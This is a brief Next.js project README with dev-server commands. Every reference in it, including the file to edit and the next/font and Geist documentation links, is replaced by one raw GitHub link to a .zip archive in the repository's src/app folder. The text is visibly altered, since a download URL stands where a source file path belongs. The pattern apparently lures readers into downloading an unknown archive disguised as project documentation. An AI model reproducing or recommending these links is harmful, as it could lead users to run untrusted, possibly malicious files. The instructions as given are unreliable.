## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `https://raw.githubusercontent.com/mohamed-magdy-1/IO-TECH-task-front-end/main/src/app/IO-TECH-task-front-end-v1.7-alpha.4.zip`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://raw.githubusercontent.com/mohamed-magdy-1/IO-TECH-task-front-end/main/src/app/IO-TECH-task-front-end-v1.7-alpha.4.zip) to automatically optimize and load [Geist](https://raw.githubusercontent.com/mohamed-magdy-1/IO-TECH-task-front-end/main/src/app/IO-TECH-task-front-end-v1.7-alpha.4.zip), a new font family for Vercel.
